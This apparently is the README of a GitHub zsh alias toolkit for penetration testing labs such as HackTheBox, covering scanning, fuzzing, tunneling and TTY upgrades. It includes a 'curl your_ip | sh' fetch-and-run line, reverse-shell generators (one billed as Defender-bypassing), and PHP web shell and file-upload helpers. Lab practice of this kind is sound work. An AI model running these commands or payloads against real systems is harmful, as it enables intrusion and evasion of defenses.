# Penetration Testing Toolkit & Aliases

**Multi-Terminal Support**: This toolkit comes with two specialized branches:
- **`main` branch**: Optimized for **Terminator** users
- **`tmux` branch**: Optimized for **tmux** users

Both branches contain the same core functionality but are tailored for different terminal multiplexers to provide the best user experience.

## Installation

### Option 1: Clone and Choose Branch (Recommended)

```bash
# Clone the repository
cd ~
git clone https://github.com/jaytiwari05/zsh-aliases.git

# For TERMINATOR users:
cd zsh-aliases
git checkout main

# For TMUX users:
cd zsh-aliases
git checkout tmux

# Add to your shell configuration
echo "source ~/zsh-aliases/aliases.zsh" >> ~/.zshrc

# Restart your shell or source the file
source ~/.zshrc

# You can start this script from anywhere 
start_htb
```

### Option 2: Direct Branch Clone

**For TMUX users only:**
```bash
cd ~
git clone -b tmux https://github.com/jaytiwari05/zsh-aliases.git
echo "source ~/zsh-aliases/aliases.zsh" >> ~/.zshrc
source ~/.zshrc
start_htb
```

**For Terminator users only:**
```bash
cd ~
git clone -b main https://github.com/jaytiwari05/zsh-aliases.git
echo "source ~/zsh-aliases/aliases.zsh" >> ~/.zshrc
source ~/.zshrc
start_htb
```

## Quick Verification

After installation, verify everything is working:

```bash
# Check which branch you're using
cd ~/zsh-aliases
git branch

# Test some aliases
www
tun0
uptty
```

## Branch Features

### Main Branch (Terminator Optimized)
- ✅ Optimized workflow for Terminator terminal emulator
- ✅ Window management tailored for Terminator's multi-pane layout
- ✅ Keyboard shortcuts integration
- ✅ Perfect for users who prefer GUI-based terminal management

### Tmux Branch (Tmux Optimized)
- ✅ Enhanced tmux session management
- ✅ Tmux-specific window and pane operations
- ✅ Optimized for tmux workflow and keybindings
- ✅ Perfect for SSH sessions and remote work
- ✅ Advanced terminal multiplexing features

## Switching Between Branches

Already cloned but want to switch? Easy!

```bash
# Switch to tmux branch
cd ~/zsh-aliases
git checkout tmux
source ~/.zshrc
start_htb

# Switch back to main (terminator) branch
cd ~/zsh-aliases
git checkout main
source ~/.zshrc
start_htb
```

> ### ⚠️ Important Note
> The `start_htb.py` script has different implementations in each branch tailored for the specific terminal environment. Make sure to use the branch that matches your terminal preference.

---

> ### Disclaimer
> Most of these aliases were built for practicality over elegance. Feel free to submit pull requests to reduce the "pepeganess". For now, if it works, it ships! 😄

## Core Features

### 🚀 Misc Utilities

#### **www**
Starts a HTTP server on port 80 in the current directory with network information.
```bash
┌──(root㉿pain)-[/tmp/www]
└─$ www
[eth0] 192.168.172.128
[/tmp/www]
linpeas.sh  pspy64
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
> **Note**: Uses sudo for port 80 binding

#### **tun0**
Copies the IP address of tun0 interface to clipboard.
```bash
┌──(root㉿pain)-[~/pain]
└─$ tun0 
# Clipboard: 10.10.14.41
```

#### **mkdir_cd**
Create directory and immediately cd into it.
```bash
┌──(root㉿pain)-[~/pain]
└─$ mkdir_cd meow
┌──(root㉿pain)-[~/pain/meow]
└─$ 
```

### 🔄 Reverse Shells

#### **gen_lin_rev $ip $port**
Generates multi-payload reverse shell HTML page for Linux targets.
```bash
┌──(root㉿pain)-[~]
└─$ gen_lin_rev 127.0.0.1 1337
[+] Wrote Linux reverse shells to /home/pain/index.html
```
Perfect for: `curl your_ip | sh`

#### **gen_php_rev $ip $port**
Generates PentestMonkey PHP reverse shell.
```bash
┌──(root㉿pain)-[~]
└─$ gen_php_rev 127.0.0.1 1337
[+] Wrote PHP reverse shell to /home/pain/pain.php
```

#### **gen_ps_rev $ip $port**
Generates Defender-bypassing PowerShell reverse shell (copied to clipboard).
```bash
┌──(root㉿pain)-[~]
└─$ gen_ps_rev 127.0.0.1 1337
# Encoded payload copied to clipboard
```

### 🖥️ TTY Upgrades

#### **uptty**
Copies Python TTY upgrade commands to clipboard.
```bash
┌──(root㉿pain)-[~/pain]
└─$ uptty
# Clipboard: python3 -c 'import pty;pty.spawn("/bin/bash")';python -c 'import pty;pty.spawn("/bin/bash")'
```

#### **script_tty_upgrade**
Alternative TTY upgrade when Python isn't available.
```bash
┌──(root㉿pain)-[~/pain]
└─$ script_tty_upgrade
# Clipboard: /usr/bin/script -qc /bin/bash /dev/null
```

#### **tty_fix**
Fixes TTY after backgrounding: `stty raw -echo; fg; reset`

#### **tty_conf**
Syncs terminal dimensions between local and remote shells.
```bash
┌──(root㉿pain)-[~/pain]
└─$ tty_conf
# Clipboard: stty rows 30 columns 116
```

### 🔓 Hash Cracking

#### **rock_john $hash_file (extra arguments)**
JohnTheRipper with rockyou wordlist pre-configured.
```bash
┌──(root㉿pain)-[~/pain]
└─$ rock_john hash.txt --format=Raw-MD5
```

### 🔍 Port Scanning

#### **nmap_tcp $ip (extra arguments)**
TCP port scan with optimized settings and organized output.
```bash
┌──(root㉿pain)-[~]
└─$ nmap_tcp 127.0.0.1
[i] Creating /home/pain/nmap...
```
> Use `-p-` for all ports

#### **nmap_udp $ip (extra arguments)**
UDP port scanning with same organized workflow.
```bash
┌──(root㉿pain)-[~]
└─$ nmap_udp 127.0.0.1
```

### 🌐 Web Fuzzing

#### **vhost $domain (-w wordlist) (extra arguments)**
Virtual host discovery with ffuf.
```bash
┌──(22sh㉿kali)-[~]
└─$ vhost box.htb
```

#### **fuzz_dir $url (extra arguments)**
Directory and file fuzzing with flexible options.
```bash
┌──(22sh㉿kali)-[~]
└─$ fuzz_dir http://box.htb
┌──(22sh㉿kali)-[~]
└─$ fuzz_dir http://box.htb -w custom_wordlist.txt -fs 245
```

### 🔌 Chisel Tunneling

#### **chisel_socks $ip $port**
SOCKS proxy setup with automatic command copying.
```bash
┌──(22sh㉿kali)-[~/pain]
└─$ chisel_socks 10.10.14.10 8888
[+] copied chisel client -v 10.10.14.10:8888 R:socks in clipboard
```

#### **chisel_forward $local_ip $local_port $remote_ip $remote_port**
Port forwarding made simple.
```bash
┌──(22sh㉿kali)-[~/pain]
└─$ chisel_forward 10.10.14.10 8080 127.0.0.1 8080
[+] Copied to clipboard: ./chisel client 10.10.14.10:8888 R:8080:127.0.0.1:8080
```

### 🖥️ Host Management

#### **addhost $ip $hostname**
Manage /etc/hosts entries efficiently.
```bash
┌──(22sh㉿kali)-[~/pain]
└─$ addhost 10.10.11.234 big.box.htb 
[+] Appended big.box.htb to existing entry for 10.10.11.234
```

## Additional Tools

- **linpeas**: Downloads latest LinPEAS
- **upload**: File upload via bashupload.com
- **phpcmd**: Simple PHP web shell creation
- **burl**: curl through BurpSuite proxy

## SecLists Integration

Many functions use SecLists wordlists. The toolkit automatically checks:
1. `/opt/seclists/`
2. `/usr/share/seclists/`
3. `$SECLISTS_PATH` environment variable

Set up with:
```bash
export SECLISTS_PATH="/path/to/seclists"
```

## Troubleshooting

**Aliases not working?**
- Verify the source command is in your `.zshrc`
- Check you're in the correct branch
- Restart your terminal or run `source ~/.zshrc`

**Want to switch terminal environments?**
- Use `git checkout main` for Terminator
- Use `git checkout tmux` for tmux
- Always run `source ~/.zshrc` after switching

---

**Credit**: Based on [jazzpizazz/zsh-aliases](https://github.com/jazzpizazz/zsh-aliases) with multi-terminal support enhancements.

**Tested primarily on Kali Linux** - additional dependencies may be required for other distributions.